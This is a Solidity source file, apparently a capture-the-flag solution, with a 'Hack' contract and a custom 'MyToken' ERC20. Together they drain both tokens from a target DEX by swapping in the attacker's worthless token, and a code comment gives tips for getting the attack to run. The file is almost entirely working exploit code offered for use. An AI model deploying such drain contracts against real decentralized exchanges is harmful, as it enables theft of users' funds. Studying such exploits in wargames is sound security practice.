// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {
    IDex dex;
    IERC20 public token1;
    IERC20 public token2;
    IERC20 public myToken;

    constructor(IDex target, IERC20 _myToken) {
        dex = target;
        token1 = IERC20(dex.token1());
        token2 = IERC20(dex.token2());
        myToken = _myToken;
        /*u need to manually approve 10000 things before u try the hack function below, look at the Gas Estimation Revert message when u try to call the hack function and look carefully to find the returned errror through the 
        for it to work, in my case ive added MYTOKEN to the returns of some functions to debug easier*/
    }

    function hack() public {
        token1.transferFrom(msg.sender, address(this), 10);
        token2.transferFrom(msg.sender, address(this), 10);
        myToken.approve(address(dex),10000);

        dex.swap(address(myToken), address(token2),100);
        dex.swap(address(myToken), address(token1),200);
        require(token1.balanceOf(address(dex)) == 0, "failed");
        require(token2.balanceOf(address(dex)) == 0, "failed");
    }
}

contract MyToken {
    string public name = "MyToken";
    string public symbol = "MTK";
    uint8 public decimals = 18;

    uint256 public totalSupply = 100000000;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function transfer(address to, uint256 value) public returns (bool) {
        require(to != address(0), "Transfer to zero address MYTOKEN");
        require(balanceOf[msg.sender] >= value, "Insufficient balance MYTOKEN");

        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public returns (bool) {
        require(to != address(0), "Transfer to zero address MYTOKEN");
        require(balanceOf[from] >= value, "Insufficient balance MYTOKEN");
        require(allowance[from][msg.sender] >= value, "Allowance exceeded MYTOKEN");

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
}

interface IDex {
    function token1() external view returns(address);
    function token2() external view returns(address);
    function swap(address from, address to, uint256 amount) external;
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}
